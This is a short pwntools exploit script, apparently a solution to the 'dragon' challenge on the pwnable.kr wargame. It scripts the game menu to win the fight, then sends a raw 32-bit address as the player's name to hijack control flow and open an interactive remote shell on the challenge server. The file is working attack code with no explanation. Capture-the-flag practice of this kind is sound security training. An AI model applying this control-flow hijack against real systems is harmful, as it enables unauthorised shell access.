#!/usr/bin/python
from pwn import *

def skip_baby():
	r.sendlineafter('Knight\n','2')
	r.sendlineafter('But You Lose 20 HP.\n', '2')

def kill_the_dragon():
	r.sendlineafter('[ 2 ] Knight\n', '1')
	for i in range(4):
		r.sendlineafter('Temporarily Invincible.\n', '3')
		r.sendlineafter('Temporarily Invincible.\n', '3')	
		r.sendlineafter('Temporarily Invincible.\n', '2')


#r = process('./dragon')
r = remote('pwnable.kr', 9004)

skip_baby()
kill_the_dragon()

_system = 0x8048530
shell = 0x08048DBF

payload = p32(shell)

r.sendlineafter('The World Will Remember You As:\n', payload)


r.interactive()

